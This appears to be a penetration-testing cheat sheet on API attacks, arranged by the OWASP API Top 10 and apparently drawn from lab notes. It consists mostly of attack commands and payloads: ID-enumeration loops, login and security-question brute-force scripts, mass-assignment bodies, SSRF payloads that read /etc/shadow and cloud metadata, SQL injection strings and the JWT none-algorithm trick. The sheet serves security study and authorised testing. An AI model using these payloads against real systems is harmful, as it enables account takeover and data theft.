# API Attacks

## OWASP API Security Top 10 (2023)

| Risk | Description |
|------|-------------|
| API1 | Broken Object Level Authorization (BOLA/IDOR) |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization (BFLA) |
| API6 | Unrestricted Access to Sensitive Business Flows |
| API7 | Server Side Request Forgery (SSRF) |
| API8 | Security Misconfiguration (Injection) |
| API9 | Improper Inventory Management |
| API10 | Unsafe Consumption of APIs |

---

## API Recon

### Swagger/OpenAPI Discovery

```
/swagger
/swagger-ui
/swagger-ui.html
/api-docs
/v1/api-docs
/v2/api-docs
/openapi.json
```

### Common API Paths

```
/api/v1/
/api/v2/
/api/v0/   # legacy versions often unprotected
```

---

## BOLA / IDOR (API1)

* Broken Object Level Authorization - access other users' data by manipulating IDs
* Test by changing ID parameters (integers, GUIDs, UUIDs)

### Mass BOLA Abuse with Bash Loop

```bash
for ((i=1; i<=20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://TARGET/api/v1/resource/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer JWT_TOKEN' | jq
done
```

### ffuf IDOR Enumeration

```bash
ffuf -w ids.txt:ID -u http://TARGET/api/v1/users/ID -H "Authorization: Bearer JWT" -mc 200
```

---

## Broken Authentication (API2)

### Password Brute Force with ffuf

```bash
ffuf -w passwords.txt:PASS -w emails.txt:EMAIL \
  -u http://TARGET/api/v1/authentication/sign-in \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email": "EMAIL", "Password": "PASS"}' \
  -fr "Invalid Credentials" -t 100
```

### Security Question Brute Force

```python
#!/usr/bin/python3
import requests

with open("wordlist.txt", "r") as fp:
    words = [x.strip() for x in fp.readlines()]

for word in words:
    headers = {"accept": "application/json", "Content-Type": "application/json"}
    data = {
        "Email": "target@example.com",
        "SecurityQuestionAnswer": word,
        "NewPassword": "newpass123456"
    }
    req = requests.post("http://TARGET/api/v1/passwords/reset", headers=headers, json=data)
    if "success" in req.text.lower():
        print(f"[+] Found: {word}")
        print(req.text)
        break
```

---

## Mass Assignment (API3)

* Modify fields you shouldn't have access to
* Look for hidden/sensitive fields in API responses
* Try adding extra fields in PATCH/PUT requests

### Common Mass Assignment Fields

```json
{
  "isAdmin": true,
  "role": "admin",
  "isVerified": true,
  "isExemptedFromFee": 1,
  "balance": 99999,
  "discount": 100
}
```

### Test Mass Assignment

```bash
curl -X PATCH 'http://TARGET/api/v1/users/current' \
  -H 'Authorization: Bearer JWT' \
  -H 'Content-Type: application/json' \
  -d '{"name": "test", "isAdmin": true}'
```

---

## Unrestricted Resource Consumption (API4)

### Generate Large File for Upload DoS

```bash
# Create 30MB random file
dd if=/dev/urandom of=large_file.pdf bs=1M count=30

# Create fake executable
dd if=/dev/urandom of=malicious.exe bs=1M count=10
```

### Test File Upload Abuse

* No file size validation = storage exhaustion DoS
* No file type validation = malicious file upload
* Check if uploaded files are publicly accessible

```bash
# Download uploaded file from wwwroot
curl -O http://TARGET/uploads/malicious.exe
```

---

## BFLA (API5)

* Access endpoints without required roles
* Test all endpoints even without proper authorization
* Check if role checks are actually enforced

```bash
# Even without roles, try privileged endpoints
curl -X GET 'http://TARGET/api/v1/admin/users' \
  -H 'Authorization: Bearer JWT'
```

---

## SSRF (API7)

### File URI Scheme SSRF

```bash
# Update a field to point to local file
curl -X PATCH 'http://TARGET/api/v1/profile' \
  -H 'Authorization: Bearer JWT' \
  -H 'Content-Type: application/json' \
  -d '{"fileURI": "file:///etc/passwd"}'
```

### Common SSRF Payloads

```
file:///etc/passwd
file:///etc/shadow
file:///flag.txt
file:///proc/self/environ
http://127.0.0.1:80
http://localhost:8080/admin
http://169.254.169.254/latest/meta-data/  # AWS metadata
```

### Retrieve SSRF Results

```bash
# Get endpoint that reads the fileURI
curl -X GET 'http://TARGET/api/v1/profile/document' \
  -H 'Authorization: Bearer JWT'

# Decode base64 response
echo "BASE64_DATA" | base64 -d
```

---

## SQL Injection (API8)

### Test for SQLi

```
laptop'          # error = potential SQLi
laptop' OR 1=1-- # returns all records
```

### API SQLi Payloads

```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
admin'--
1 OR 1=1
1' ORDER BY 1--
1' UNION SELECT NULL--
```

---

## Improper Inventory Management (API9)

### Check for Old API Versions

```
/api/v0/  # often unprotected legacy
/api/v1/
/api/v2/
```

* Old versions may lack authentication
* May expose deleted/legacy data
* Check Swagger dropdown for multiple versions

---

## JWT Manipulation

### Decode JWT

```bash
# JWT structure: header.payload.signature
echo "HEADER_BASE64" | base64 -d
echo "PAYLOAD_BASE64" | base64 -d
```

### JWT None Algorithm Attack

```json
{"alg": "none", "typ": "JWT"}
```

### JWT Key Confusion

* RS256 → HS256 downgrade
* Use public key as HMAC secret

---

## Useful Tools

```bash
# Postman - API testing GUI
# Burp Suite - intercept/modify requests
# ffuf - fuzzing
# jq - JSON parsing
# CyberChef - encoding/decoding
```

### jq Examples

```bash
# Pretty print JSON
curl -s http://TARGET/api/v1/users | jq

# Extract specific field
curl -s http://TARGET/api/v1/users | jq '.[].email'

# Filter results
curl -s http://TARGET/api/v1/users | jq '.[] | select(.role=="admin")'
```
